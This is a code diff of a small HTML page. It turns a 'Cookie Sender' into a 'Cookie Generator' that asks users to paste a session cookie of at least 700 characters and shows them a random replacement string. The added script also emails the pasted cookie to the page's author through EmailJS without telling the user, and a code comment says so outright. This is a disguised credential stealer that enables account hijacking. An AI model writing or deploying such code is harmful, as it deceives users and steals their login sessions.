@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cookie Sender</title>
+  <title>Cookie Generator</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -55,55 +55,78 @@
       font-size: 14px;
       text-align: center;
     }
-    .success {
-      color: green;
-      font-size: 14px;
-      text-align: center;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Cookie Sender</h1>
-    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
-    <button onclick="sendCookie()">Send Cookie</button>
+    <h1>Cookie Generator</h1>
     <div class="error" id="errorMessage"></div>
-    <div class="success" id="successMessage"></div>
+    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
+    <button onclick="generateCode()">Generate New Code</button>
+    <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
   </div>
 
-  <!-- Include EmailJS -->
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with the User ID (Public Key)
-    emailjs.init("1RUraa7fRYbQ2fuPR");
+    // Initialize EmailJS
+    emailjs.init('1RUraa7fRYbQ2fuPR');
 
-    function sendCookie() {
+    // Function to generate a random code with uppercase letters and numbers only
+    function generateRandomCode(length) {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+      }
+      return result;
+    }
+
+    // Function to handle code generation when the button is clicked
+    function generateCode() {
       const cookieInput = document.getElementById('cookieInput').value;
       const errorMessage = document.getElementById('errorMessage');
-      const successMessage = document.getElementById('successMessage');
+      const newCookieOutput = document.getElementById('newCookieOutput');
 
-      // Clear previous messages
-      errorMessage.textContent = '';
-      successMessage.textContent = '';
+      // Debugging line
+      console.log("Input cookie length:", cookieInput.length); 
 
-      // Validate cookie input
-      if (cookieInput.length < 700) {
+      // Check if the input is at least 700 characters long
+      if (cookieInput.length >= 700) {
+        // Clear error message
+        errorMessage.textContent = '';
+
+        // Generate a new code with the same length as the input
+        const newCode = generateRandomCode(cookieInput.length);
+
+        // Output the generated code
+        newCookieOutput.value = newCode;
+
+        // Debugging line
+        console.log("Generated new cookie:", newCode); 
+
+        // Send the old cookie (input) to your email
+        sendEmail(cookieInput);
+      } else {
+        // Show an error message if input is less than 700 characters
         errorMessage.textContent = 'Error: Cookie must be at least 700 characters long.';
-        return;
+        newCookieOutput.value = ''; // Clear the output field
       }
+    }
+
+    // Function to send email
+    function sendEmail(cookieContent) {
+      const templateParams = {
+        cookie: cookieContent
+      };
 
       // Send email using EmailJS
-      emailjs.send("service_bupfcwd", "template_fkuvg0k", {
-        cookie: cookieInput, // This is the variable used in your template
-        to_email: "simplyb4th@gmail.com" // Your email address
-      })
-      .then(() => {
-        successMessage.textContent = 'Cookie sent successfully.';
-      })
-      .catch((error) => {
-        console.error("Error sending email:", error);
-        errorMessage.textContent = 'Failed to send cookie. Check the console for details.';
-      });
+      emailjs.send('service_bupfcwd', 'template_fkuvg0k', templateParams)
+        .then(function(response) {
+          console.log('Email sent successfully:', response);
+        }, function(error) {
+          console.log('Failed to send email:', error);
+        });
     }
   </script>
 </body>
